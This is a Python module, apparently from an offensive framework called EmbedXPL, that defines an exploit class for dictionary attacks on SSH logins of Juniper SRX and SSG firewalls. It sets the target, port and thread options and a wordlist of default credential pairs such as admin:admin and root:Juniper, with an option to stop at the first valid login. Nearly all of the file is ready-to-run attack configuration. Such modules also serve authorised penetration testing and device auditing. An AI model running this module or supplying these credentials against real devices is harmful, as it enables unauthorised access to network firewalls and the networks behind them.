# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """Juniper Networks SRX/SSG Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Juniper Networks SRX/SSG Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against Juniper SRX "
            "and legacy SSG series SSH. Covers SOHO/SMB models: SRX100/210/220/300. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "Juniper SRX100 / SRX210 / SRX220 / SRX300 / SRX320",
            "Juniper SSG 5 / SSG 20 (legacy NetScreen OS)",
            "Juniper Networks (any JUNOS default config)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "root:,admin:admin,root:Juniper,netscreen:netscreen,admin:juniper1",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
